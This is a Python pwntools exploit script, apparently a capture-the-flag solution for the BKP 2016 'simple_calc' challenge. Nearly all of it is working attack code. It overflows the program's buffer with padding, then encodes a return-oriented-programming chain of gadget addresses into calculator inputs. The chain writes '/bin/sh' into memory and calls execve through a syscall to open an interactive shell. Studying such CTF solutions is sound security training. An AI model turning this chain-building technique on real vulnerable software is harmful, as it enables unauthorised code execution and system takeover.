from pwn import *
import math
import struct

context(arch="amd64", os="linux")
def mypack(address):
    address = struct.pack(">Q",address)
    return address[4:]+address[:4]

def send(sh, data):
    total = int(data, 0)
    print total
    if total >= 2*39:
        divX = int(math.floor(total/2.0))
        divY = int(math.ceil(total/2.0))
        sh.sendline("1")
        print sh.recv(timeout=1)
        sh.sendline(str(divX))
        print sh.recv(timeout=1)
        sh.sendline(str(divY))
        print sh.recv(timeout=1)
    else:
        divX= 100000 + total
        divY= 100000
        sh.sendline("2")
        print sh.recv(timeout=1)
        sh.sendline(str(divX))
        sh.recv(timeout=1)
        sh.sendline(str(divY))
        sh.recv(timeout=1)


def send_exploit(sh, data):
    sh.sendline(str((len(data)/4)+2)) #plus 1 for last 5 instruction
    for x in range(0, len(data), 4):
        send_part = "0x" + data[x:x+4].encode("hex")
        send(sh, send_part)
    print "[+ Executing Exploit]"
    sh.sendline("5")
    sh.interactive()

#ropsearch "pop rdx; ret" 0x00400000 0x004c1000
movraxrdx = mypack(0x00445353) #0x00445353 : (b'488910c3')        mov QWORD PTR [rax],rdx; ret
pop_rsi = mypack(0x004649c0) # 0x00410c09 : (b'5ec3')        pop rsi; ret
syscall = mypack(0x00467f75) #0x00467f75 : (b'0f05c3')        syscall; ret)
bin_sh =  "nib/\x00hs/"
pop_rax = mypack(0x004749d8) #0x004749d8 : (b'58c3')        pop rax; ret
#pop_rax = "HHHH\x00\x00\x00\x00"
pop_rdx = mypack(0x004560b4) #0x004560b4 : (b'5ac3')        pop rdx; ret)
bss = mypack(0x006c0000)
pop_rdi = mypack(0x00463600) #0x00463600 : (b'5fc3')        pop rdi; ret
execve = mypack(59)#        execve        stub_execve        fs/exec.c

exploit = 12*"AAAA" #junk
exploit += 3*8*"\x00" #free address + extra
exploit += pop_rax #return address
exploit += bss #put heap on rax
exploit += pop_rdx
exploit += bin_sh #put bin sh on rdx
exploit += movraxrdx #put sh on [rax] is heap
#prepareer syscall
#rdi, rsi, rdx
exploit += pop_rdi
exploit += bss #location
exploit += pop_rsi
exploit += mypack(0x0)
exploit += pop_rdx
exploit += mypack(0x0)
exploit += pop_rax
exploit += execve
exploit += syscall
exploit += 16*4*"D"

print "[+ process started]"
sh = process("/root/Desktop/ctf/BKP_2016/simple_calc")
#sh = process("/bin/sh")
#sh.sendline("gdb /root/Desktop/ctf/BKP_2016/simple_calc")
sh.recv(timeout=1)
#breaks GDB
#sh.sendline("b *0x004749d8")
#print sh.recv(timeout=1)
#sh.sendline("r")
send_exploit(sh, exploit)
sh.close()
